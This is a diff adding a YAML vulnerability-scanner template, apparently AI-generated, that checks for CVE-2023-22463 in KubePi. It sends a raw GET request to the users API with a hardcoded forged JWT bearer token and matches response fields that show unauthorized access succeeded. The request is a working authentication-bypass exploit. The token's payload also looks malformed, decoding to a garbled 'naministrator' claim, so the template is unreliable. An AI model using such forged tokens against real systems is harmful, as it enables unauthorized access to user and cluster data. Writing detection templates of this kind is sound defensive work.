@@ -1,0 +1,27 @@
+id: cve-2023-22463
+info:
+  name: KubePi Hardcoded Credentials Vulnerability (CVE-2023-22463)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: hardcoded-credentials,cve,cve-2023-22463
+
+http:
+  - raw:
+      - |
+        GET /kubepi/api/v1/users HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1pbmlzdHJhdG9yIjp0cnVlLCJtZmEiOnsiZW5hYmxlIjpmYWxzZSwic2VjcmV0IjoiIiwiYXBwcm92ZWQiOmZhbHNlfX0.XxQmyfq_7jyeYvrjqsOZ4BB4GoSkfLO2NvbKCEQjld8
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "apiVersion"
+        part: body
+      - type: word
+        words:
+          - "nickName"
+        part: body
+      - type: word
+        words:
+          - "type"
+        part: body
